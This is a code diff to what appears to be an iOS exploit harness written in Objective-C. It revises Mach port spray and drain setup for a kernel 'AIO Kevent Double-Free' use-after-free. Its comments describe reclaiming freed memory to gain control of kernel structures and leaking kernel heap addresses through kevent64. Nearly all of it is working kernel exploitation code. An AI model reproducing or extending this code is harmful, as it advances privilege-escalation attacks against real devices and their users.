@@ -3668,14 +3668,13 @@ static void *aio_free_and_reclaim_racer(void *arg) {
     mach_port_t spraySend = MACH_PORT_NULL;
     __block int sprayReady = 0;
     if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &sprayRecv) == KERN_SUCCESS) {
-        mach_port_t dummy;
-        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &dummy) == KERN_SUCCESS) {
-            mach_port_mod_refs(mach_task_self_, dummy, MACH_PORT_RIGHT_RECEIVE, -1);
-            if (mach_port_insert_right(mach_task_self_, sprayRecv, dummy,
-                                        MACH_MSG_TYPE_MAKE_SEND) == KERN_SUCCESS) {
-                spraySend = dummy;
-                sprayReady = 1;
-            }
+        mach_msg_type_name_t poly = 0;
+        if (mach_port_extract_right(mach_task_self_, sprayRecv,
+            MACH_MSG_TYPE_MAKE_SEND, &spraySend, &poly) == KERN_SUCCESS) {
+            sprayReady = 1;
+        } else {
+            mach_port_destroy(mach_task_self_, sprayRecv);
+            sprayRecv = MACH_PORT_NULL;
         }
     }
     [self appendLog:[NSString stringWithFormat:@"  Spray port: %@", sprayReady ? @"OK" : @"FAILED"]];
@@ -5671,17 +5670,18 @@ static void *aio_free_and_reclaim_racer(void *arg) {
 // Confirms ext[1] control via reclaim aio_nbytes (distinct marker).
 // Leaks kernel heap address via kevent64 ident field.
 
-static int64_t _aioUafLastRun = 0;
-
 - (void)aioUafTapped {
-    int64_t now = (int64_t)([[NSDate date] timeIntervalSince1970] * 1000);
-    if (now - _aioUafLastRun < 3000) {
-        [self appendLog:@"⚠ Debounced — ignoring duplicate tap"];
-        return;
+    @synchronized([ViewController class]) {
+        static int64_t _aioLast = 0;
+        int64_t now = (int64_t)([[NSDate date] timeIntervalSince1970] * 1000);
+        if (now - _aioLast < 3000) {
+            [self appendLog:@"⚠ Debounced"];
+            return;
+        }
+        _aioLast = now;
     }
-    _aioUafLastRun = now;
 
-    [self appendLog:@"\n========== AIO Kevent Double-Free v11 =========="];
+    [self appendLog:@"\n========== AIO Kevent Double-Free v12 =========="];
 
     // Disable button to prevent double-tap
     dispatch_async(dispatch_get_main_queue(), ^{
@@ -5873,31 +5873,88 @@ static int64_t _aioUafLastRun = 0;
     mach_port_t drainRecv[kDrainPorts];
     mach_port_t drainSend[kDrainPorts];
     int drainPortsReady = 0;
-    for (int p = 0; p < kDrainPorts; p++) {
-        drainRecv[p] = MACH_PORT_NULL;
-        drainSend[p] = MACH_PORT_NULL;
-        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &drainRecv[p]) == KERN_SUCCESS) {
+
+    // Diagnostic: try mach_port_extract_right on the first port to see what works
+    mach_port_t testRecv = MACH_PORT_NULL, testSend = MACH_PORT_NULL;
+    kern_return_t kr1 = mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &testRecv);
+    if (kr1 == KERN_SUCCESS) {
+        mach_msg_type_name_t poly = 0;
+        kern_return_t kr2 = mach_port_extract_right(mach_task_self_, testRecv,
+            MACH_MSG_TYPE_MAKE_SEND, &testSend, &poly);
+        if (kr2 == KERN_SUCCESS) {
+            // Verify receive still works: send 1 msg, recv it back
+            mach_msg_header_t tmsg = {0};
+            tmsg.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+            tmsg.msgh_size = sizeof(tmsg);
+            tmsg.msgh_remote_port = testSend;
+            kern_return_t krs = mach_msg(&tmsg, MACH_SEND_MSG, sizeof(tmsg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+            if (krs == MACH_MSG_SUCCESS) {
+                mach_msg_header_t rmsg = {0};
+                rmsg.msgh_size = sizeof(rmsg);
+                rmsg.msgh_local_port = testRecv;
+                kern_return_t krr = mach_msg(&rmsg, MACH_RCV_MSG, 0, sizeof(rmsg), testRecv, 0, MACH_PORT_NULL);
+                if (krr == MACH_MSG_SUCCESS) {
+                    [self appendLog:[NSString stringWithFormat:@"  port test: extract_right OK — recv=%d send=%d both work", testRecv, testSend]];
+                    // Use this approach for all ports
+                    drainRecv[0] = testRecv;
+                    drainSend[0] = testSend;
+                    drainPortsReady = 1;
+                    testRecv = MACH_PORT_NULL; // prevent cleanup
+                } else {
+                    [self appendLog:[NSString stringWithFormat:@"  port test: extract_right send OK but RECV failed kr=0x%x", krr]];
+                    mach_port_destroy(mach_task_self_, testRecv);
+                }
+            } else {
+                [self appendLog:[NSString stringWithFormat:@"  port test: extract_right OK but SEND failed kr=0x%x", krs]];
+                mach_port_destroy(mach_task_self_, testRecv);
+            }
+        } else {
+            [self appendLog:[NSString stringWithFormat:@"  port test: extract_right FAILED kr=0x%x — trying destroy approach", kr2]];
+            // Fallback: destroy dummy receive right, then insert send
             mach_port_t dummy;
             if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &dummy) == KERN_SUCCESS) {
-                mach_port_mod_refs(mach_task_self_, dummy, MACH_PORT_RIGHT_RECEIVE, -1);
-                if (mach_port_insert_right(mach_task_self_, drainRecv[p], dummy,
-                                            MACH_MSG_TYPE_MAKE_SEND) == KERN_SUCCESS) {
-                    drainSend[p] = dummy;
-                    drainPortsReady++;
+                kern_return_t krd = mach_port_destroy(mach_task_self_, dummy);
+                kern_return_t kri = mach_port_insert_right(mach_task_self_, testRecv, dummy, MACH_MSG_TYPE_MAKE_SEND);
+                [self appendLog:[NSString stringWithFormat:@"  port test: destroy=%d insert=0x%x recv=%d send=%d", krd, kri, testRecv, dummy]];
+                if (kri == KERN_SUCCESS) {
+                    drainRecv[0] = testRecv;
+                    drainSend[0] = dummy;
+                    drainPortsReady = 1;
+                    testRecv = MACH_PORT_NULL;
+                } else {
+                    mach_port_destroy(mach_task_self_, testRecv);
                 }
             }
         }
+    } else {
+        [self appendLog:[NSString stringWithFormat:@"  port test: allocate FAILED kr=0x%x", kr1]];
     }
-    // Dedicated port for overlap spray — same trick
+    if (testRecv != MACH_PORT_NULL) mach_port_destroy(mach_task_self_, testRecv);
+
+    // Create remaining drain ports using whichever approach worked
+    for (int p = drainPortsReady; p < kDrainPorts; p++) {
+        drainRecv[p] = MACH_PORT_NULL;
+        drainSend[p] = MACH_PORT_NULL;
+        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &drainRecv[p]) == KERN_SUCCESS) {
+            mach_msg_type_name_t poly = 0;
+            if (mach_port_extract_right(mach_task_self_, drainRecv[p],
+                MACH_MSG_TYPE_MAKE_SEND, &drainSend[p], &poly) == KERN_SUCCESS) {
+                drainPortsReady++;
+            } else {
+                mach_port_destroy(mach_task_self_, drainRecv[p]);
+                drainRecv[p] = MACH_PORT_NULL;
+            }
+        }
+    }
+
+    // Dedicated port for overlap spray
     mach_port_t overlapRecv = MACH_PORT_NULL, overlapSend = MACH_PORT_NULL;
     if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &overlapRecv) == KERN_SUCCESS) {
-        mach_port_t dummy;
-        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &dummy) == KERN_SUCCESS) {
-            mach_port_mod_refs(mach_task_self_, dummy, MACH_PORT_RIGHT_RECEIVE, -1);
-            if (mach_port_insert_right(mach_task_self_, overlapRecv, dummy,
-                                        MACH_MSG_TYPE_MAKE_SEND) == KERN_SUCCESS) {
-                overlapSend = dummy;
-            }
+        mach_msg_type_name_t poly = 0;
+        if (mach_port_extract_right(mach_task_self_, overlapRecv,
+            MACH_MSG_TYPE_MAKE_SEND, &overlapSend, &poly) != KERN_SUCCESS) {
+            mach_port_destroy(mach_task_self_, overlapRecv);
+            overlapRecv = MACH_PORT_NULL;
         }
     }
     [self appendLog:[NSString stringWithFormat:@"  Drain ports: %d/%d ready", drainPortsReady, kDrainPorts]];
